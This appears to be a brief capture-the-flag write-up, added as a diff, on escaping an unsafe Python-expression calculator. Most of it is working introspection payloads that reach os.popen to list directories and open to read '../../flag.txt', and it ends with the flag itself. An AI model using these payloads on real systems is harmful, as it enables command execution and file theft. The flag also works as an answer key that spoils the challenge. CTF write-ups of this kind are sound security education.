@@ -1,0 +1,12 @@
+The calculator evaluates Python expressions unsafely.
+
+Used Python introspection to access system commands:
+(1).__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()
+
+Listed files and found flag.txt two levels up:
+...popen('ls ../..').read()
+
+Read the flag file:
+(1).__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['__builtins__']['open']('../../flag.txt').read()
+
+Got the flag: 1nf1n1ty{V1b3_c0d1ng_1s_n0t_g00d_f0r_S3cur1ty}
